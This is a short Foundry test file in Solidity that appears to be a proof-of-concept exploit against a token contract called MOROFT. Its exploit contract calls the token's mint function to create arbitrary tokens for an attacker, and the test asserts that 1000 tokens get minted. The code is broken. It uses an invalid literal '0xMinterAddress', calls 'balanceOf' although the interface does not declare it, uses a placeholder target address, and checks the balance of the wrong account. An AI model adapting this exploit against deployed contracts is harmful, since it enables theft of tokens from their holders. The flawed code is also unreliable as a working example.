// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface IMOROFT {
    function mint(address to, uint256 amount) external;
    function updateMinter(address minter, bool status) external;
}

contract MOROFTExploit {
    IMOROFT public target;
    address public attacker;

    constructor(address _target) {
        target = IMOROFT(_target);
        attacker = msg.sender;
    }

    function executeAttack(uint256 amount) external {
        require(msg.sender == attacker, "Only attacker can call this");
        target.mint(attacker, amount);
    }
}

contract MOROFTTest is Test {
    IMOROFT target;
    MOROFTExploit exploit;
    address minter;

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com");
        target = IMOROFT(0x0000000000000000000000000000000000000001);
        minter = address(0xMinterAddress);
        exploit = new MOROFTExploit(address(target));
        target.updateMinter(minter, true); // Set up minter
    }

    function testMintingExploit() public {
        uint256 initialBalance = target.balanceOf(address(exploit));
        uint256 mintAmount = 1000 ether;

        exploit.executeAttack(mintAmount);

        uint256 finalBalance = target.balanceOf(address(exploit));
        assertTrue(finalBalance == initialBalance + mintAmount, "Exploit should allow minting arbitrary tokens");
    }
}